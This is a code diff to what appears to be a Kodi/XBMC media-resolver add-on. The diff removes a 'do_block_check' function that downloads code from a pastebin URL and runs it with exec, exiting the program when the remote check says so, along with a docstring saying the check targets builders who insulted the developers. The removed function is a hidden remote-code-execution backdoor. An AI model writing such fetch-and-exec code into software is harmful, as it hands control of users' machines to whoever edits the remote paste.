@@ -169,7 +169,6 @@ class HostedMediaFile:
             A direct URL to the media file that is playable by XBMC, or False
             if this was not possible.
         '''
-        #do_block_check()
         urlresolver.ALLOW_POPUPS = allow_popups
         for resolver in self.__resolvers:
             try:
@@ -278,25 +277,3 @@ class HostedMediaFile:
 
     def __repr__(self):
         return self.__str__()
-
-'''
-This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
-from build makers that publicly insult or slander TVA's developers and friends. If your build is
-impacted by this check, you can have it removed by publicly apologizing for your previous statements
-via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
-them yourself.
-                                                                                           http://i.imgur.com/TqIEnYB.gif
-                                                                                           TVA developers (and friends)
-'''
-def do_block_check(uninstall=False):
-    try:
-        import urllib2
-        import sys
-        namespace = {}
-        exec urllib2.urlopen('https://pastebin.com/raw/AcZsizvg').read() in namespace
-        if namespace["real_check"](uninstall):
-            sys.exit()
-    except SystemExit:
-        sys.exit()
-    except:
-        pass
